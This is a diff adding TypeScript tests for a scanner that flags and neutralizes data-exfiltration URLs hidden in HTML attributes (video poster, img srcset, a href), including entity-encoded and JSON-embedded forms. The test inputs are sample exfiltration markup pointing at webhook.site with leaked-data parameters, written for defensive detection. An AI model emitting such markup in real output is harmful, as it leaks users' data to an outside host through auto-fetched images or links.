@@ -274,6 +274,44 @@ describe('encoded destinations (#580)', () => {
     expect(neutralizeExfil(body, f)).not.toContain('webhook.site')
   })
 
+  // #674: poster, srcset and href are fetched (or followed) the same way src is.
+  describe('poster, srcset and href (#674)', () => {
+    it('flags a poster, which a video fetches without a click', () => {
+      expect(scanResponseExfil('<video poster="https://webhook.site/?d=1"></video>', isExfil).map(f => f.kind)).toEqual(['html-image'])
+    })
+
+    it('flags each srcset candidate, not only the first', () => {
+      const f = scanResponseExfil('<img srcset="https://cdn.trusted.com/a.png 1x, https://webhook.site/?d=1 2x">', isExfil)
+      expect(f.map(x => x.url)).toEqual(['https://webhook.site/?d=1'])
+      expect(f.map(x => x.kind)).toEqual(['html-image'])
+    })
+
+    it('flags an href as the one-click link it is', () => {
+      expect(scanResponseExfil('<a href="https://webhook.site/leak">here</a>', isExfil).map(f => f.kind)).toEqual(['markdown-link'])
+    })
+
+    it('reads these attributes inside a JSON body and in encoded form', () => {
+      const body = JSON.stringify({ text: '<video poster="https:\\\\webhook.site/?d=1"></video> <a href="&#x68;ttps://webhook.site/x">a</a>' })
+      const f = scanResponseExfil(body, isExfil)
+      expect(f.map(x => x.kind)).toEqual(['html-image', 'markdown-link'])
+      expect(neutralizeExfil(body, f)).not.toContain('webhook.site')
+    })
+
+    it('does not flag these attributes pointing at an allowed host', () => {
+      expect(scanResponseExfil('<video poster="https://cdn.trusted.com/p.png"></video> <a href="https://docs.trusted.com/">x</a> <img srcset="https://cdn.trusted.com/a.png 2x">', isExfil)).toEqual([])
+    })
+
+    it('stays linear on 200 KB of unfinished poster, href and srcset attributes', () => {
+      for (const filler of ['<video poster="', '<a href="', '<img srcset="https://a.example/x 1x, ', '<audio src=x ']) {
+        const text = filler.repeat(Math.ceil(200_000 / filler.length))
+        const started = Date.now()
+        scanResponseExfil(text, isExfil)
+        scanResponseExfil(JSON.stringify({ text }), isExfil)
+        expect(Date.now() - started, filler).toBeLessThan(500)
+      }
+    })
+  })
+
   it('does not flag an encoded relative or allowed destination', () => {
     expect(scanResponseExfil('![x](&#x2F;docs&#x2F;a.png) <img src="&#x2F;img&#x2F;logo.png"> [r]: docs/x', isExfil)).toEqual([])
     expect(scanResponseExfil('![x](https&#58;&#47;&#47;cdn.trusted.com/a.png)', isExfil)).toEqual([])
